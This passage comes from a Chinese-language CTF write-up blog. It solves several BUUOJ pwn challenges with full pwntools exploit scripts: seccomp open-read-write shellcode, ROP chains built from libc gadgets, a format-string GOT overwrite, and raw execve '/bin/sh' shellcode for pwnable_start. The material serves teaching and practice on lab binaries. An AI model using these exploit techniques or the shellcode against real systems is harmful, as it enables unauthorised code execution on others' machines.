gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()win_function1 = <span class="hljs-number">0x080485CB</span>win_function2 = <span class="hljs-number">0x80485D8</span>flag = <span class="hljs-number">0x0804862B</span>offset = <span class="hljs-number">0x18</span> + <span class="hljs-number">4</span>ru(<span class="hljs-string">'Enter your input&gt;'</span>)payload = <span class="hljs-string">'a'</span> * offset + flat([win_function1,win_function2,flag,<span class="hljs-number">0xBAAAAAAD</span>,<span class="hljs-number">0xDEADBAAD</span>])<span class="hljs-comment"># debug()</span>s(payload + <span class="hljs-string">'\n'</span>)itr()</code></pre></div><h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a><code>pwnable_orw</code></h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>考点 ：</p><ul><li>简单shellcode 的编写</li><li>seccomp（挖坑）</li></ul><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/P0Ku7D.png" srcset="/img/loading.gif" alt></p><p>先用<code>seccomp-tools</code>看下禁用了什么函数：</p><div class="hljs"><pre><code class="hljs undefined">➜  pwnable_orw seccomp-tools dump ./orw line  CODE  JT   JF      K================================= <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) goto <span class="hljs-number">0011</span> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) goto <span class="hljs-number">0011</span> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) goto <span class="hljs-number">0011</span> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) goto <span class="hljs-number">0011</span> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == exit) goto <span class="hljs-number">0011</span> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) goto <span class="hljs-number">0011</span> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) goto <span class="hljs-number">0011</span> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) goto <span class="hljs-number">0011</span> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>) <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW</code></pre></div><p>明显只能执行 open read wirte 函数。</p><div class="hljs"><pre><code class="hljs undefined">#这里可以用pwntools库的一个函数代替,shellcraftc语言:<span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/orw/flag"</span>) &lt;==&gt; 汇编:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/orw/flag"</span>))c语言:<span class="hljs-built_in">read</span>(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x20</span>)&lt;==&gt; 汇编:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">read</span>(<span class="hljs-number">3</span>,<span class="hljs-string">"esp"</span>,<span class="hljs-number">0x20</span>)c语言:<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x20</span>)&lt;==&gt;汇编:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,<span class="hljs-string">"esp"</span>,<span class="hljs-number">0x20</span>))</code></pre></div><p>其中 就是以esp当做临时变量 buf的地址，其可以自定义。</p><p>其中open函数执行后，由于是打开了一个新的文件，其返回的fd就是3，所以后面跟着的read的文件描述符也为3。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./orw'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26224</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = []realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()bss = <span class="hljs-number">0x804A128</span> - <span class="hljs-number">0x30</span>payload= asm(shellcraft.open(<span class="hljs-string">"./flag"</span>))payload += asm(shellcraft.read(<span class="hljs-number">3</span>,bss,<span class="hljs-number">0x30</span>))payload += asm(shellcraft.write(<span class="hljs-number">1</span>,bss,<span class="hljs-number">0x30</span>))sl(payload)itr()</code></pre></div><h2 id="V-amp-N2020-公开赛warmup"><a href="#V-amp-N2020-公开赛warmup" class="headerlink" title="V&amp;N2020 公开赛warmup"></a>V&amp;N2020 公开赛warmup</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>开启了沙盒，使用orw获取flag即可。</p><div class="hljs"><pre><code class="hljs undefined">Here <span class="hljs-keyword">is</span> my gift: <span class="hljs-number">0x7f411f85c9c0</span> line  CODE  JT   JF      K================================= <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) goto <span class="hljs-number">0011</span> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &gt;= <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0011</span> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A == execve) goto <span class="hljs-number">0011</span> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A != write) goto <span class="hljs-number">0010</span> <span class="hljs-number">0006</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000024</span>  A = count &gt;&gt; <span class="hljs-number">32</span> # write(fd, buf, count) <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) goto <span class="hljs-number">0010</span> <span class="hljs-number">0008</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000020</span>  A = count # write(fd, buf, count) <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x10</span>) goto <span class="hljs-number">0011</span> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL</code></pre></div><p>其中，这题因为只有<code>0x10</code>的溢出空间，猛的一看需要栈迁移，但是会发现不知道往哪里迁移。看了师傅们的博客才知道，由于第一个栈空间较大，且与第二个可以溢出的栈是<strong>紧邻</strong>的。然后，就可以在溢出时覆盖一下返回地址，覆盖为ret，这样就可以多一个ret，从而<strong>接着执行</strong>上一个栈帧buf里面构造的rop链。</p><p>并且在orw中，open函数的第一个参数时一个指针地址(<code>*filename</code>)，所以需要先read一下flag的文件名到一个buf当中，然后再进行orw。</p><p>Buf的寻找：<br>在libc中找一个没有用到的地址段即可。比如<code>__free_hook</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/B3tfJG.png" srcset="/img/loading.gif" alt></p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./vn_pwn_warmup'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27585</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)pop_rdi = <span class="hljs-number">0x0000000000021102</span> + libc_basepop_rsi = <span class="hljs-number">0x00000000000202e8</span> + libc_basepop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_baseopen = libc_base+libc.sym[<span class="hljs-string">'open'</span>]read = libc_base+libc.sym[<span class="hljs-string">'read'</span>]puts = libc_base+libc.sym[<span class="hljs-string">'puts'</span>]buf = libc_base+libc.sym[<span class="hljs-string">'__free_hook'</span>]payload = flat([    pop_rdi,<span class="hljs-number">0</span>,pop_rsi,buf,pop_rdx,<span class="hljs-number">8</span>,read,    pop_rdi,buf,pop_rsi,<span class="hljs-number">0</span>,pop_rdx,<span class="hljs-number">0</span>,open,    pop_rdi,<span class="hljs-number">3</span>,pop_rsi,buf,pop_rdx,<span class="hljs-number">0x30</span>,read,    pop_rdi,buf,puts])sa(<span class="hljs-string">':'</span>,payload)<span class="hljs-comment"># debug()</span>ret = libc_base + <span class="hljs-number">0x0000000000000937</span>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x78</span> + p64(ret)sa(<span class="hljs-string">'?'</span>,payload)sleep(<span class="hljs-number">1</span>)<span class="hljs-comment"># debug()</span>s(<span class="hljs-string">'./flag\x00\x00'</span>)itr()</code></pre></div><h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a><code>picoctf_2018_buffer overflow 1</code></h2><p>简单的栈溢出，且存在后门。</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./PicoCTF_2018_buffer_overflow_1'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29988</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()win = <span class="hljs-number">0x080485CB</span>offset = <span class="hljs-number">0x28</span> + <span class="hljs-number">0x4</span>payload = <span class="hljs-string">'a'</span>*offset + p32(win)sa(<span class="hljs-string">':'</span>,payload)itr()</code></pre></div><h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow 2"></a><code>picoctf_2018_buffer overflow 2</code></h2><p>类似上题，考个控制传参。</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./PicoCTF_2018_buffer_overflow_2'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29988</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()win = <span class="hljs-number">0x80485CB</span>offset = <span class="hljs-number">0x6c</span> + <span class="hljs-number">0x4</span>payload = <span class="hljs-string">'a'</span>*offset + p32(win) + p32(<span class="hljs-number">0xDEADBEEF</span>) + p32(<span class="hljs-number">0xDEADBEEF</span>) + p32(<span class="hljs-number">0xDEADC0DE</span>)s(payload)</code></pre></div><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p>32位的格式化字符串，考的是单次printf多次写入，因为是32位pwntools的<code>fmtstr_payload</code>是十分好用的。</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./axb_2019_fmt32'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29147</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()printf_got = <span class="hljs-number">0x804A014</span>payload = <span class="hljs-string">"%9$sA"</span> + p32(<span class="hljs-number">0x804A014</span>)sla(<span class="hljs-string">'me:'</span>,payload)ru(<span class="hljs-string">'Repeater:'</span>)printf_got = uu32(r(<span class="hljs-number">4</span>))libc_base = printf_got - <span class="hljs-number">0x049020</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)offset = <span class="hljs-number">8</span>rce = libc_base + <span class="hljs-number">0x3a80c</span>info_addr(<span class="hljs-string">'rec'</span>,rce)payload = <span class="hljs-string">'a'</span> + fmtstr_payload(offset,&#123;<span class="hljs-number">0x804A014</span>:rce&#125;,write_size = <span class="hljs-string">"byte"</span>,numbwritten = <span class="hljs-number">10</span>)sla(<span class="hljs-string">'me:'</span>,payload)itr()</code></pre></div><h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a><code>pwnable_start</code></h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>32位，无任何保护，作者自己汇编写的程序。<br>分析汇编以后可以认为就是：</p><div class="hljs"><pre><code class="hljs c">write(<span class="hljs-number">1</span>,esp,<span class="hljs-number">20</span>)read(<span class="hljs-number">0</span>,esp,<span class="hljs-number">60</span>)</code></pre></div><p>十分明显的栈溢出，但是难点在shellcode摆上栈以后，如何跳转过去执行。</p><p>利用思路：</p><ul><li>利用控制eip，返回wirte处，泄漏一下栈地址，然后根据偏移算出esp的地址</li><li>摆shellcode上栈，控制好eip</li></ul><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./start'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27834</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-comment"># debug()</span>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)sa(<span class="hljs-string">":"</span>,payload)new_esp = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">4</span>addr_shellcode = new_esp + <span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>info_addr(<span class="hljs-string">'new esp'</span>,new_esp)shellcode  = <span class="hljs-string">"\x31\xc0\x50\x68\x2f\x2f\x73"</span>shellcode += <span class="hljs-string">"\x68\x68\x2f\x62\x69\x6e\x89"</span>shellcode += <span class="hljs-string">"\xe3\x89\xc1\x89\xc2\xb0\x0b"</span>shellcode += <span class="hljs-string">"\xcd\x80\x31\xc0\x40\xcd\x80"</span>s(<span class="hljs-string">'a'</span> * <span class="hljs-number">0x14</span> + p32(addr_shellcode) + shellcode)itr()</code></pre></div><p>Shell code 网上一找有很多，找到一个合适字节限制，且可以执行的即可。</p><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a><code>inndy_rop</code></h2><p>做法跟 <code>cmcc_simplerop</code>基本一样，除了偏移。</p><p>32位下，<code>sys_execve(&quot;sh&quot;, 0, 0, 0)</code> 行不通。（上来测试这个，测试一阵子）</p><h2 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="BJDCTF 2nd secret"></a>BJDCTF 2nd secret</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>慢慢分析可以发现一个溢出点，且利用此处只是可以做到任意地址的数据减1。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/MX0AfS.png" srcset="/img/loading.gif" alt></p><p>然后想到可以在got表处下手，<strong>其中printf、system函数在程序达到一定条件才会运行。所以其got处的值是特定的，并且是相近的。</strong></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XkCKMA.png" srcset="/img/loading.gif" 